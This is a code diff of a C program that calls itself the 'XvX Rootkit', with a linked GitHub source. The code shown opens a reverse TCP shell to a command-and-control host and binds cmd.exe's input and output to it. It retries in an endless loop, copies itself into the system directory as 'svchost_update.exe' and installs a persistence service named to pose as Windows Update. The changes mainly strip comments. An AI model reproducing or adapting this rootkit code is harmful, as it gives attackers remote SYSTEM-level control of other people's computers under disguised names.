@@ -1,13 +1,13 @@
 /*
  * XvX Rootkit - Privilege Escalation
- * Copyright (c) 2025 - 28zaakypro@proton.me
+ * Copyright (c) 2026 - 28zaakypro@proton.me
  *
  * UAC bypass via fodhelper.exe and token stealing from winlogon.exe.
  * Establishes reverse TCP shell to C2 server with SYSTEM privileges.
  * 
  * Compile: gcc -o PrivEsc_C2.exe PrivEsc_C2.c -ladvapi32 -lshell32 -luser32 -lws2_32
  * 
- * See more here : https://github.com/28Zaaky/Priv-Escalation-Exploit
+ * From here : https://github.com/28Zaaky/Priv-Escalation-Exploit
  */
 
 #include <winsock2.h>
@@ -177,13 +177,11 @@ BOOL CreateReverseShell(const char *host, int port)
     STARTUPINFOA si = {sizeof(si)};
     PROCESS_INFORMATION pi = {0};
 
-    // Initialiser Winsock
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
     {
         return FALSE;
     }
 
-    // Create
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock == INVALID_SOCKET)
     {
@@ -191,12 +189,10 @@ BOOL CreateReverseShell(const char *host, int port)
         return FALSE;
     }
 
-    // Configure serveur
     server.sin_family = AF_INET;
     server.sin_port = htons(port);
     server.sin_addr.s_addr = inet_addr(host);
 
-    // Connexion au C2
     if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR)
     {
         closesocket(sock);
@@ -204,13 +200,11 @@ BOOL CreateReverseShell(const char *host, int port)
         return FALSE;
     }
 
-    // Redirect stdin/stdout/stderr to socket
     si.dwFlags = STARTF_USESTDHANDLES;
     si.hStdInput = (HANDLE)sock;
     si.hStdOutput = (HANDLE)sock;
     si.hStdError = (HANDLE)sock;
 
-    // Launch cmd.exe
     char cmdPath[MAX_PATH];
     GetSystemDirectoryA(cmdPath, MAX_PATH);
     // Use safe string concatenation
@@ -227,8 +221,6 @@ BOOL CreateReverseShell(const char *host, int port)
         return FALSE;
     }
 
-    // DO NOT wait for completion - let process run
-    // Windows service maintains active shell
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 
@@ -277,7 +269,7 @@ BOOL StealSystemToken()
         return FALSE;
     }
 
-    // Instead of CreateProcessWithTokenW, create reverse shell with SYSTEM token
+    // Create reverse shell with SYSTEM token
     STARTUPINFOA si = {sizeof(si)};
     PROCESS_INFORMATION pi = {0};
 
@@ -319,17 +311,15 @@ BOOL InstallAsService()
     char exePath[MAX_PATH];
     GetModuleFileNameA(NULL, exePath, MAX_PATH);
 
-    // Copier vers un emplacement système
     char servicePath[MAX_PATH];
     GetSystemDirectoryA(servicePath, MAX_PATH);
-    // Use safe string concatenation
+    
     if (strlen(servicePath) + strlen("\\svchost_update.exe") < MAX_PATH) {
         strcat_s(servicePath, MAX_PATH, "\\svchost_update.exe");
     }
 
     CopyFileA(exePath, servicePath, FALSE);
-
-    // Create
+    
     char serviceCmd[MAX_PATH + 50];
     snprintf(serviceCmd, sizeof(serviceCmd), "\"%s\" --system-shell", servicePath);
 
@@ -350,7 +340,6 @@ BOOL InstallAsService()
         return FALSE;
     }
 
-    // Start service
     StartServiceA(hService, 0, NULL);
 
     CloseServiceHandle(hService);
@@ -368,15 +357,13 @@ BOOL CreatePersistentService()
         SC_HANDLE hService = OpenServiceA(hSCM, "WindowsUpdateService", SERVICE_QUERY_STATUS);
         if (hService)
         {
-            // Service existe déjà
             CloseServiceHandle(hService);
             CloseServiceHandle(hSCM);
             return TRUE;
         }
         CloseServiceHandle(hSCM);
     }
-
-    // Install service
+    
     return InstallAsService();
 }
 
@@ -385,12 +372,11 @@ int main(int argc, char *argv[])
     // SYSTEM reverse shell mode
     if (argc > 1 && strcmp(argv[1], "--system-shell") == 0)
     {
-        // Infinite loop to maintain persistent shell
         while (TRUE)
         {
             if (!CreateReverseShell(C2_HOST, C2_PORT))
             {
-                Sleep(30000); // Wait before retry
+                Sleep(30000);
             }
         }
         return 0;
@@ -401,32 +387,26 @@ int main(int argc, char *argv[])
     {
         if (IsAdmin())
         {
-            // Create persistant
             if (CreatePersistentService())
             {
-                // Service created, will restart automatically
                 return 0;
             }
             else
             {
-                // Fallback : exécuter directement
                 StealSystemToken();
             }
         }
         return 0;
     }
 
-    // Initial mode
     if (IsAdmin())
     {
-        // Create persistant
         if (CreatePersistentService())
         {
             return 0;
         }
         else
         {
-            // Fallback : exécuter directement
             StealSystemToken();
         }
     }
